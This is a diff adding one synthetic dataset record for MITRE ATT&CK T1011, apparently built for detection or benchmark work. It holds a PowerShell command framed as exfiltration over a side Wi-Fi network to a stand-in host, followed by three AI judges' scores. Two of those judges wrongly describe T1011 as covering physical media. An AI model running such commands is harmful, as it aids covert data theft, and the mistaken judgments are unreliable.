@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
+  "explanation": "Connects to a non-corporate Wi‑Fi network and exfiltrates by binding iperf3 to the Wi‑Fi interface on an uncommon port, explicitly using Wi‑Fi as an alternate medium (T1011).",
+  "rationale_steps": [
+    "Join a dedicated Wi‑Fi network separate from the primary network.",
+    "Discover the Wi‑Fi interface's local IP.",
+    "Run iperf3 client bound to that IP using a high port.",
+    "Limit duration to reduce exposure."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce74f7d7",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes, valid separators, and plausible parameters/variable usage.",
+        "semantic_score": 1,
+        "semantic_justification": "It connects to a Wi‑Fi network and generates iperf3 traffic rather than moving data via a physical medium; iperf3 does not exfiltrate arbitrary content, so this is misaligned with T1011’s removable-media focus.",
+        "combined_score": 3.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T08:41:31.616700Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid piping, error handling, and correct parameter usage for both the netsh and iperf3 commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully aligns with T1011 by connecting to a non-corporate Wi-Fi network (physical medium), determining the correct IP address, and using iperf3 to exfiltrate data over that connection for 45 seconds on an uncommon port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:41:34.706157Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct separators, and valid Powershell cmdlet and external program syntax.",
+        "semantic_score": 1,
+        "semantic_justification": "The command's action of exfiltrating data over a Wi-Fi network does not align with MITRE ATT&CK T1011, which specifically describes exfiltration via transferring data onto a physical medium that is then physically transported.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:41:49.853540Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
